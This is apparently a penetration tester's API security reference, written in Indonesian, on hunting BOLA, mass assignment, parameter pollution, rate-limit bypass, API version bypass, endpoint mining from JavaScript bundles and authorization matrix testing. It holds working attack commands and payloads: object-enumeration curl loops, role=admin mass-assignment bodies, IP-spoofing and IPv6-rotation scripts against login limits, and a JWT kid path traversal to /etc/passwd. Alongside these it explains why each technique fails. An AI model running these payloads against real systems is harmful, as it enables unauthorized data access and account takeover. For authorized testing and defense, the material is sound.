# api-sec — api

# API Security: Hunting Reference

## 1. BOLA (Broken Object Level Authorization)

**Konsep:** Endpoint mengembalikan/modifikasi objek berdasarkan `id` param tanpa cek ownership.

**Baseline recon — UUID vs sequential:**
```bash
# Sequential
for i in $(seq 1 100); do
  curl -sk -H "Authorization: Bearer $T1" "https://api.target/v1/users/$i/orders" -o "/tmp/o_$i.json"
done
# Deteksi: respon 200 dengan order milik user lain = BOLA
```

**Swap-object test (dua akun):**
```http
GET /api/v1/invoices/550e8400-e29b-41d4-a716-446655440000 HTTP/2
Host: api.target
Authorization: Bearer <TOKEN_USER_A>
```
Expected: `403` jika authz benar. Muncul: `200 + body invoice user B` → BOLA.

**Nested/parent-child bypass** (authz dicek di parent, bukan child):
```http
GET /api/v1/orgs/111/projects/222/secrets/333 HTTP/2
Authorization: Bearer <TOKEN_USER_A>   # member org 111, bukan 222
```
Cek apakah filter hanya `orgs/111` di path, tapi `projects/222` tidak divalidasi relasi ke 111.

**Method swap:** `GET` → `HEAD`, `PUT`, `PATCH`, `DELETE`. Sering authz middleware hanya enforce di `GET`.

```http
PATCH /api/v1/users/777/profile HTTP/2
Content-Type: application/merge-patch+json
Authorization: Bearer <TOKEN_USER_A>

{"email":"attacker@x.tld"}
```

**Batch endpoint BOLA (GraphQL/persisted):**
```json
{"query":"query{user(id:\"7\"){email} u2:user(id:\"8\"){email}}"}
```
Alias `u2` sering lolos dari per-response authz yang hanya cek `data.user`.

**Bypass heuristik:** id numeric → tambah `0007`, `7.0`, `0x7`, `+7`, `7%00`, `7 OR 1=1` (jika query builder naif). UUIDv4 yang dikembalikan di `/me` endpoint sering jadi vektor karena saling swap.

**Kenapa gagal:** Jika service pakai opaque ID yang di-derive dari session (mis. HMAC `user_id` + resource) atau Row Level Security Postgres 16 (`CREATE POLICY ... USING (owner = current_setting('app.uid'))`) — BOLA jadi tidak terlihat di layer aplikasi.

---

## 2. Mass Assignment / Field Discovery

**Apa yang dikirim:** JSON body dengan field tambahan yang tidak ada di UI.

```http
PATCH /api/v1/users/me HTTP/2
Content-Type: application/json
Authorization: Bearer <TOKEN>

{"email":"a@b.c","role":"admin","is_verified":true,"tenant_id":"00000000-0000-0000-0000-000000000000","balance":999999}
```

**Pola framework yang rentan:**
| Framework | Vektor default |
|---|---|
| Rails 5.0+ / 7.1 | `permit!` atau `params.require(:u).permit(:email)` lupa field |
| Laravel 9/10/11 | `$fillable` kosong + `$guarded=[]` |
| Django REST 3.15 | `fields = '__all__'` + `read_only` kosong di ModelSerializer |
| Spring Boot 3.x | Jackson `ObjectMapper` tanpa `@JsonIgnoreProperties`; `@ModelAttribute` binding |
| Marshmallow 3.x | `unknown=INCLUDE` |
| NestJS/class-validator | `whitelist:false` di `ValidationPipe` |

**Field discovery via OPTIONS:**
```http
OPTIONS /api/v1/users/me HTTP/2
```
Cek `Allow:` (method tersembunyi) — tetapi jarang mengembalikan schema. Yang lebih berguna:

```bash
curl -sk -X OPTIONS -I "https://api.target/api/v1/users" \
  | grep -Ei 'allow|access-control'
```

**Discovery via GraphQL introspection** (kalau tidak dimatikan):
```graphql
{__type(name:"User"){inputFields{name type{name kind ofType{name}}}}}
```
Atau mutation `__schema` traversal. Cari `inputFields` yang tidak ada di UI (mis. `isAdmin`, `accountTier`, `internalNotes`).

```bash
# via graphql-cop
graphql-cop -t https://api.target/graphql
```

**Discovery via JS bundle (SPA — React/Vue/Next.js 14):**
```bash
# Dump
curl -s https://app.target/ | grep -oE '/_next/static/[^"]+\.js' | sort -u | \
  xargs -I{} curl -s "https://app.target{}" -o -  >> /tmp/all.js

# Cari field name & endpoint
grep -oE '"[a-zA-Z_][a-zA-Z0-9_]{2,30}"' /tmp/all.js | sort -u > /tmp/id.txt
grep -oE '"/api/v[0-9]/[a-zA-Z0-9_/{}-]+"' /tmp/all.js | sort -u
```
Source maps (`.js.map`) aktif = jackpot:
```bash
curl -s https://app.target/_next/static/chunks/main-<hash>.js.map | jq -r '.sources[]'
```

**Discovery via error messages:** Kirim `{}` kosong atau field unknown — DRF balik `"field X is required"`, Spring balik `"Field error in object 'user' on field 'role'"`. Iteratif enumerasi.

**Kenapa berhasil:** ORM/deserializer binding semua key di body ke model tanpa whitelist. **Gagal** jika: DTO eksplisit (`class UserUpdateDTO` di Java), `express-validator` sanitisasi, atau `ModelSerializer` dengan `read_only_fields` menyeluruh.

---

## 3. HTTP Parameter Pollution (HPP)

**Apa yang dikirim:** Parameter duplikat untuk memecah pandangan antara proxy/WAF vs backend.

```http
POST /api/v1/transfer HTTP/2
Content-Type: application/x-www-form-urlencoded

amount=1&to=attacker&to=victim
```

| Stack | Perilaku |
|---|---|
| PHP 8.3 (default) | `to` = last value (`victim`) |
| Express 4.19 + `qs` | `to` = array `["attacker","victim"]` → sering crash/drop |
| Flask 3.0 (Werkzeug) | `request.args.get('to')` = **first** |
| ASP.NET Core 8 | Server-side model binder = **first**, WAF sering lihat **last** |
| nginx 1.25 `$arg_to` | hanya match pertama |

**Attack pattern — WAF sees safe, app sees evil:**
```
?amount=1&to=victim&to=attacker   → WAF query: to=victim|attacker (array), rules mungkin skip
```

**JSON variant:**
```http
{"role":"user","role":"admin"}
```
Jackson (Spring) default: last wins. `ObjectMapper` dengan `FAIL_ON_READING_DUP_TREE_KEY` = fail. Laravel `json_decode` = last wins. Python `json.loads` = last wins.

**Array-vs-scalar confusion (Express/Laravel):**
```http
POST /api/v1/comments HTTP/2
Content-Type: application/json

{"author":"x","author[]":"admin"}
```
Atau form:
```
role[]=user&role[]=admin
```
Jika backend pakai `role in ['user','admin']` dan value jadi array, perbandingan Python `["admin"] in [...]` = False, tapi `in` di JS = truthy check berbeda.

**Kenapa berhasil:** Komponen berbeda (CDN → nginx → app) mem-parse duplicate keys berbeda. **Gagal** jika seluruh pipeline normalisasi (mis. nginx `$arg_x` + app parser sama-sama first) atau ada kanonikalisasi di API gateway (Kong 3.6 dengan plugin `request-validator`).

---

## 4. Rate-Limit Bypass

**Identifikasi:** Set `X-RateLimit-Limit` / `Retry-After` header. Cek bucket key.

```bash
for i in $(seq 1 20); do curl -s -o /dev/null -w "%{http_code} %{time_total}\n" \
  -X POST https://api.target/v1/login -d 'user=a&pass=b'; done
```

**4a. X-Forwarded-For / client-IP header spoof:**
```http
POST /v1/login HTTP/2
X-Forwarded-For: 10.0.0.1
X-Real-IP: 10.0.0.1
Forwarded: for=10.0.0.1
X-Client-IP: 10.0.0.1
CF-Connecting-IP: 10.0.0.1
True-Client-IP: 10.0.0.1
```
Rotate per request. Nginx 1.25 `real_ip_module` — jika `set_real_ip_from` terlalu lebar (mis. `0.0.0.0/0`), attacker bisa spoof dari internet langsung. Express default `trust proxy = false` = aman; jika `true` tanpa config CIDR, XFF di-trust penuh.

**Deteksi:** Buktikan bucket di-key pada IP header:
```bash
# Req 1-10 dengan XFF sama → 429 di req ke-11
# Ulang dengan XFF increment → tidak pernah 429 = BUG
```

**4b. IPv6 rotation** (jika key = /64 tapi attacker punya /48):
```bash
for i in $(seq 1 100); do
  ip="2001:db8:$(printf '%x' $((RANDOM%65535))):$(printf '%x' $((RANDOM%65535)))::1"
  curl -s --interface $ip -X POST https://api.target/v1/login -d 'u=a&p=b'
done
```
Atau pakai `proxy.py` + bind prefix IPv6. Cloud VPS / Vultr / Oracle Cloud sering beri /64 tanpa biaya.

**4c. Case variation (path / header):**
```
/v1/Login   /v1/LOGIN   /V1/login   /v1//login   /v1/./login   /v1/login/
/v1/login?x=1  /v1/login#a  /v1/login%00  /v1/login%2e
```
Banyak nginx `location = /v1/login` (exact) vs `location /v1/` — rule rate-limit di satu block tidak apply ke block lain.

**Header case:**
```
X-Forwarded-For  vs  x-forwarded-for  (HTTP/2 lowercase, tapi HTTP/1.1 mixed)
```
WAF yang match string case-sensitive bisa bypass.

**4d. Content-Type confusion:**
```http
POST /v1/login HTTP/2
Content-Type: application/json; charset=utf-8
```
vs `application/x-www-form-urlencoded` — beberapa WAF hanya inspeksi body JSON.

**4e. Method variant & GraphQL:**
```
GET /v1/login?u=a&p=b        (jika GET login aktif — Mongo-style)
POST /graphql  {"query":"mutation{login(u:\"a\",p:\"b\"){token}}"}
```
GraphQL batch via alias atau `[{"query":...},{"query":...}]` array — banyak gateway hitung 1 request.

**Kenapa gagal:** Bucket di-key pada `session_id` (setelah auth), atau rate limit di layer berbeda (Cloudflare 2024 default rules + token bucket di origin). IPv6 rotation gagal jika origin enforce `key = /64` pada XFF yang di-sanitize ke pengirim asli.

---

## 5. API Versioning Bypass

**Apa yang dikirim:** Variasi path/header untuk mencapai versi lama atau jalur internal.

**Path matrix (fuzz paralel):**
```
/v1/users/7         /v2/users/7
/v1.0/users/7       /v0/users/7
/v1beta/users/7     /v1alpha/users/7
/v1/internal/users/7
/v1/admin/users/7
/v1/users/7?api-version=2023-01-01   (Azure ARM)
/v1/users/7?version=1
/_internal/v1/users/7
/api/v1/users/7  vs  /api/v2/users/7  vs  /api/users/7
/v1/users/7.1  /v1/users/7.0  /v1/users/07
```

**Header versioning (Kirim semua sekaligus):**
```http
GET /api/users/7 HTTP/2
Accept: application/vnd.target.v3+json
Accept-Version: 3.0
X-API-Version: v3
X-Version: 2024-01-01
API-Version: v3
```

**Bash sweeper:**
```bash
for v in v0 v1 v2 v3 v1beta v1alpha internal admin _internal _debug; do
  for p in users orders accounts invoices config; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $T" \
      "https://api.target/$v/$p")
    [ "$code" != "404" ] && echo "$code $v/$p"
  done
done
```

**Perilaku yang dicari:** `v1` deprecate tapi masih authz lemah; `v2` punya BOLA yang sudah di-fix tapi endpoint `v1` masih aktif. `/internal/*` sering bypass auth via mTLS yang dimatikan di dev, tapi prod menerima request dari publik karena network policy salah.

**nginx 1.25 `location` precedence:**
```
location /v1/ { ... }      # prefix
location = /v1/login { }    # exact — menang
location ~ ^/v1/ { }        # regex — bisa tidak cakup /v1/login
```
Lihat `nginx -T` (jika ada akses) atau probe dengan `OPTIONS *`.

**gRPC versioning:** `target.v1.Users/Get` vs `target.v2.Users/Get` via `grpcurl`:
```bash
grpcurl -H "authorization: Bearer $T" api.target:443 list
grpcurl -H "authorization: Bearer $T" api.target:443 list target.v1
```

**Kenapa gagal:** API gateway (Kong/AWS API Gateway) `base_path_mapping` ketat — `/v1/*` di-serve oleh service yang sama sekali beda deployment.

---

## 6. Undocumented Endpoint Mining dari JS

**Step 1 — Inventory JS:**
```bash
# Next.js / Vite / CRA
curl -s https://app.target/ | grep -oE '(src|href)="[^"]+\.js[^"]*"' | cut -d'"' -f2 | sort -u
# Webpack manifest
curl -s https://app.target/asset-manifest.json
curl -s https://app.target/_next/static/$(date +%s)/_buildManifest.js
```

**Step 2 — Ekstrak endpoint + field:**
```bash
# Endpoint regex
grep -rhoE '"(/api|/v[0-9]|/graphql|/internal)[^"]{2,80}"' /tmp/all.js | sort -u

# Template literal
grep -rhoE '`/[a-zA-Z0-9_/-]+\$\{[^}]+\}[a-zA-Z0-9_/-]*`' /tmp/all.js

# fetch/axios call sites
grep -rhoE '\.(get|post|put|patch|delete)\(["`][^"`]+["`]' /tmp/all.js | sort -u
```

**Step 3 — Source map decompile (jika ada):**
```bash
curl -s https://app.target/_next/static/chunks/pages/_app-<hash>.js.map -o /tmp/m.map
npx source-map-explorer /tmp/m.map   # atau
node -e "const m=require('/tmp/m.map');console.log(m.sources.join('\n'))"
```
Atau `sourcemapper -url https://app.target/main.js.map -output /tmp/src`.

**Step 4 — Webpack module dumping (jika inline):**
```bash
npx webpacksource /tmp/all.js /tmp/out
```

**Step 5 — Validasi dari JS ke live:**
```bash
while read -r ep; do
  ep=${ep//\"/}
  [ "${ep:0:1}" = "/" ] || continue
  code=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $T" \
    "https://api.target${ep}")
  echo "$code $ep"
done < /tmp/endpoints.txt | grep -v 404
```

**Cari khusus:** `/_debug`, `/swagger`, `/openapi.json`, `/v2/api-docs`, `/actuator`, `/.well-known/`, `/__nextjs_original-stack-frame`, `/_next/data/*`.

**Trick Next.js 14:** `/_next/data/<buildId>/<route>.json` mengembalikan props SSR — bocorkan data yang tidak di-hydrate di HTML:
```bash
curl -s "https://app.target/_next/data/<buildId>/admin/users.json" | jq
```

**Vite 5:** `import.meta.env` inlined — grep `VITE_` di bundle untuk lihat semua secret/variable frontend.

**Kenapa gagal:** Bundle di-minify + string endpoint dibangun runtime (`['/','v','1'].join('')`) atau via env (`process.env.REACT_APP_API`). Regex mati. Gunakan Chrome DevTools 131 **Coverage** panel (Ctrl+Shift+P → "Coverage") untuk ekstrak URL yang benar-benar di-fetch saat crawl UI.

---

## 7. Authz Matrix Testing

**Struktur matriks** — kombinasi (aktor × resource × action × method × versi):

| Actor \ Endpoint | `GET /v1/users/{id}` | `PATCH /v1/users/{id}` | `DELETE /v1/users/{id}` | `GET /v1/admin/users` |
|---|---|---|---|---|
| Anon | 401 | 401 | 401 | 401 |
| User A (self) | 200 | 200 | 200 (?) | 403 |
| User A (User B id) | **harus 403** | **harus 403** | **harus 403** | 403 |
| User A (A id, field `role=admin`) | 200 (field ignored) | **harus 200 tanpa ubah role** | — | 403 |
| Service token | — | — | — | 200 |
| Expired JWT | 401 | 401 | 401 | 401 |
| Algorithm=none | 401 | 401 | 401 | 401 |
| Token signed dengan `kid` lain | 401 | 401 | 401 | 401 |

**Runner (Python):**
```python
import httpx, itertools, csv

BASE = "https://api.target"
ACCOUNTS = {"A": TOKEN_A, "B": TOKEN_B, "anon": None}
TARGETS = [
    ("GET",    "/v1/users/7",      None),
    ("PATCH",  "/v1/users/7",      {"email":"x@y.z"}),
    ("DELETE", "/v1/users/7",      None),
    ("GET",    "/v1/admin/users",  None),
    ("POST",   "/v1/users/7/roles", {"role":"admin"}),
]
USER_A_ID, USER_B_ID = 1, 7

rows = []
with httpx.Client(verify=False, timeout=15) as c:
    for actor, tok in ACCOUNTS.items():
        for method, path, body in TARGETS:
            h = {"Authorization": f"Bearer {tok}"} if tok else {}
            r = c.request(method, BASE+path, headers=h, json=body)
            rows.append([actor, method, path, r.status_code, len(r.content)])

with open("matrix.csv","w",newline="") as f:
    csv.writer(f).writerows([["actor","method","path","code","len"],*rows])
```

**Automation — Authz0 / Autorize:**
- Burp **Autorize** 1.19: set session dengan User B, replay User A → highlight `200` di endpoint milik B.
- **AuthMatrix** (Burp BApp): definisikan role × endpoint, jalankan seluruh matrix.
- **Autorize** false-positive umum: endpoint GET `/v1/users/7` mengembalikan `200` tapi body `{"detail":"not found"}` — selalu cek `content-length` atau schema response.

**Guardrail test:** kirim token dengan `aud` salah, `exp` di masa depan (>1h), `scope` minimal, `kid` kosong:

```bash
# Test JWT kid traversal (jika server fetch JWKS dari kid)
curl -s https://api.target/v1/users/7 -H \
  "Authorization: Bearer $(jwt-forge --alg RS256 --kid '../../etc/passwd' --sub 7)"
```

**Behavior yang dicari:** 401 vs 403 konsisten; 200 dengan error body; 500 = unhandled exception di jalur authz (informasi); 200 dengan `Content-Type=text/html` = routing mismatch.

---

## 8. Jebakan Operasional (Field-Failure Traps)

| Teknik | Jebakan | Efek |
|---|---|---|
| BOLA via UUID | UUIDv7 (monotonic, time-based) di sistem modern — tidak sequential, tapi **predictable** jika tahu jam request | Enumerasi jadi 10^3 detik window; sebelumnya dianggap aman → miss |
| Mass assignment | Framework aktifkan `serialize` whitelist secara **default** di versi baru (Rails 7.1 `permit`, DRF 3.15 `read_only_fields` required) — test old assumption gagal | False negative → report tidak dibuat |
| HPP | nginx 1.25 `$arg_x` = **first**, tapi Kong 3.6 normalisasi ke **last** — testing hanya lewat satu layer | Bug lolos karena origin perilaku beda dari tunnel |
| XFF spoof | Cloudflare 2024 unconditional overwrite `CF-Connecting-IP` + `X-Forwarded-For` — spoof di edge mati | Waktu terbuang; verifikasi header `CF-*` dulu sebelum test |
| IPv6 rotation | Origin `key = ip/64` tapi VPS hanya `/64` — rotasi terbatas 1 netblock, hit bucket tetap | Limit terdeteksi tapi tidak bisa di-bypass; cari `/48` (/56 untuk v6 gratis di Hetzner) |
| Rate limit | Bucket di-key pada `Authorization` header hash — rotate IP tidak mempan | Butuh banyak akun; cek `Set-Cookie`/`X-RateLimit-*` dulu |
| Case variation | HTTP/2 lowercase header wajib — `X-Forwarded-For` jadi `x-forwarded-for` on-wire; WAF berbasis case-sensitive match mati | Request di-reject atau lolos tak terduga; gunakan HTTP/1.1 untuk test ini (`curl --http1.1`) |
| Version bypass | API gateway (AWS `stage`, Kong `route`) mem-parse `/v1` sebagai **path prefix statis** — `/v1/../v2/` di-reject 400 sebelum nginx | Fuzzer matikan redirect follow (`-L` off) agar lihat 301 vs 400 vs 200 |
| JS mining | Chrome 131 DevTools **Coverage** hanya tangkap fetch setelah interaksi; halaman lazy-load tidak ter-cover | Rotasi `navigator.userAgent`, jalankan Selenium/Playwright dengan viewport mobile |
| Source map | Next.js 14 prod default `productionBrowserSourceMaps: false` — `.js.map` 404 | Jangan andalkan; pakai de-minify (`webcrack`, `deobfuscator.io`) |
| Authz matrix | Test authz dijalankan paralel → rate limit 429 di tengah run = row invalid | Serialize per actor + `Retry-After` sleep; simpan raw response untuk audit |
| All above | Reproduction di staging berbeda — staging sering `NODE_ENV=development` dengan `trust proxy=true`, prod `false` (atau sebaliknya) | Validasi bug **hanya di prod target**, staging hanya konteks |

**Cross-cutting:** selalu simpan **raw HTTP** (via Burp/mitmproxy log) bukan hanya `curl` output — perbedaan HTTP/1.1 vs HTTP/2, TLS SNI, dan header ordering bisa jadi satu-satunya bukti teknik berhasil/gagal. Test ulang dengan `curl --http1.1` dan `--http2` sebelum klaim.

---

## [reasoning trace]


